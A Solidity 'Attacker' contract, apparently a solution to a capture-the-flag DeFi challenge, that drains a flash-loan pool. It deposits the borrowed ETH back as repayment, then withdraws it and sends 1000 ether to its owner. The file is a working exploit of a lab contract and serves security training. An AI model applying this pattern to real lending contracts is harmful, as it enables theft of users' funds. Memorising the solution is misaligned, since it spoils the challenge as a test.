// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract Attacker {
    SideEntranceLenderPool sideEntranceLenderPool;
    address owner;

    function setStates(
        SideEntranceLenderPool _sideEntranceLenderPool,
        address _owner
    ) external {
        sideEntranceLenderPool = _sideEntranceLenderPool;
        owner = _owner;
    }

    function takeLoan(uint256 loanAmount) public {
        sideEntranceLenderPool.flashLoan(loanAmount);
        sideEntranceLenderPool.withdraw();
        SafeTransferLib.safeTransferETH(owner, 1000 ether);
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: 1000 ether}();
    }
}
